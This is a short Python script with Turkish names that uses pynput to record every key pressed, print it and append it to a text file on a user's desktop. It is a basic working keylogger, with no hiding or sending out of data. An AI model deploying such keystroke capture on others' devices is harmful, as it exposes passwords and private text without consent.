from pynput import keyboard

def tusaBasildiginda(tus):
    try:
        print("Basılan tuş: {0}".format(tus.char))
        with open("C:\\Users\\Ibrahim\\Desktop\\basilanTuslar.txt", "a") as dosya:
            dosya.write(tus.char)
    except AttributeError:
        print("Basılan tuş: {0}".format(tus))
        with open("C:\\Users\\Ibrahim\\Desktop\\basilanTuslar.txt", "a") as dosya:
            dosya.write("\n" + str(tus) + "\n")

def tusBirakildiginda(tus):
    pass
with keyboard.Listener(on_press=tusaBasildiginda, on_release=tusBirakildiginda) as dinleyici:
    dinleyici.join()
